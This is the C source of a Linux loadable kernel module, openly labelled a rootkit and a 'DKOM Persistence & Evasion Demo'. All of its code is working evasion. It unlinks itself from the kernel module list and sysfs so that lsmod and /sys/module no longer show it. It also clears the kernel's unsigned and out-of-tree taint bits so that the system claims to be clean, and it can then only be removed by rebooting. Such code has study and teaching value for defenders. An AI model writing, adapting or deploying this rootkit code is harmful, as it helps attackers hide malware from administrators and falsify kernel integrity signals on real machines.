#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/list.h>    // For list_del_init
#include <linux/kobject.h> // For kobject_del

MODULE_LICENSE("GPL");
MODULE_AUTHOR("0xtengu");
MODULE_DESCRIPTION("DKOM Persistence & Evasion Demo");

// The build script will find the address and pass it here.
// If not defined, we default to 0 to prevent compile errors (safety check).
#ifndef TAINT_ADDR
#define TAINT_ADDR 0
#endif

// Pointer to the kernel's internal taint variable
static unsigned long *taint_ptr = (void*)TAINT_ADDR;

void hide_module(void) {
    // 1. Unlink from the Kernel Module List
    // This effectively removes us from 'lsmod' and '/proc/modules'
    // The module is still in memory, but the kernel's iterator skips it.
    list_del_init(&THIS_MODULE->list);

    // 2. Unlink from SysFS (/sys/module/)
    // This removes the directory /sys/module/vanish/
    // This prevents tools from finding us by scanning sysfs.
    kobject_del(&THIS_MODULE->mkobj.kobj);
    
    printk(KERN_INFO "rootkit: I have vanished from lsmod and sysfs.\n");
}

void scrub_taint(void) {
    if (!taint_ptr) {
        printk(KERN_ERR "rootkit: Taint address invalid.\n");
        return;
    }

    // The kernel sets specific bits when unsigned/out-of-tree modules load.
    // Bit 12: TAINT_OOT_MODULE (Out of tree)
    // Bit 13: TAINT_UNSIGNED_MODULE (Unsigned module)
    // We create a mask of these two bits.
    unsigned long mask = (1 << 12) | (1 << 13);
    
    // We use bitwise AND with NOT mask to clear ONLY those specific bits.
    // This leaves other taint flags (like hardware errors) intact.
    *taint_ptr &= ~mask;
    
    printk(KERN_INFO "rootkit: Taint bits scrubbed. Kernel claims to be clean.\n");
}

static int __init dkom_init(void) {
    printk(KERN_INFO "rootkit: Vanish module loaded. Engaging cloaking...\n");
    
    hide_module();
    scrub_taint();
    
    return 0;
}

static void __exit dkom_exit(void) {
    // NOTE: Once we unlink from the list, 'rmmod' cannot find us to unload us.
    // The only way to remove this rootkit is to reboot.
    printk(KERN_INFO "rootkit: Goodbye (if you can find me).\n");
}

module_init(dkom_init);
module_exit(dkom_exit);